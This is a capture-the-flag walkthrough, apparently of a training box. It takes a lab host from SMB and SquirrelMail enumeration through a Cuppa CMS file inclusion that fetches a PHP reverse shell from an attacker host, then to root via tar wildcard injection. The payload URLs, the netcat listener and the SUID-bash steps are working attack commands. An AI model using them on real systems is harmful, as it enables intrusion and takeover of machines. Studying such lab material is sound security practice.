Start up with an an nmap scan

BUnch of ports are open, including 80 and 445

Gobuster and nikto bring back a few results, including the /squirrelmail subdirectory

Run enumlinux -a <IP> to enumerate the machine

Enum4linux will show that there are a few shares, one of them being anonymous

Use smbclient to login to this share:
smbclient '\\10.10.6.250\anonymous'
Leave password blank and hit enter

get attention.txt and log1.txt back to your local machine

Cat out log1.txt and see a bunch of passwords

on the squirrelmail subdirectory, use username: milesdyson and password: cyborg007haloterminator

This will log you in

THe first email from skynet gives you miles's smb password

Use smbclient again to log in as milesdyson:

smbclient -U milesdyson '\\10.10.6.250\milesdyson'

cd into notes and grab important.txt

catting that out, you find another subdirectory: /45kra24zxs28v3yd

go to IP/45kra24zxs28v3yd

Not much here, but if you run gobuster against IP/45kra24zxs28v3yd , you find a /administrator subdirectory
browse to this

You see this is running on Cuppa CMS

if you use: searchsploit Cuppa
you will find an exploit

use searchsploit - m hp/webapps/25971.txt
to pull down the txt file to your current directory

Combine one of the exploit lines found in the txt file with the administrator directory:
http://10.10.6.250/45kra24zxs28v3yd/administrator/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Use this:
http://10.10.6.250/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.24.197:8000/php-reverse-shell.php

spin up a web server via python, and use netcat: nc -lnvp 8888 to listen on port 8888

Use curl http://10.10.6.250/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.24.197:8000/php-reverse-shell.php
to pull down that .php file and successfully spawn a shell on the victim machine in the terminal window that your netcat session is listening in

use python3 -c "import pty; pty.spawn('/bin/bash')"
to spawn a more stable shell

From here, after doing some enumeration, you can use a wildcard injection to priv esc
See: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
for more details on this

Seeing that there is a cron job that runs a backup as root every minute, you can use:
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

this will exploit the wildcard backup setting and turn root in /bin/bash into a SUID

now you can become root with bash -p and grab the root flag
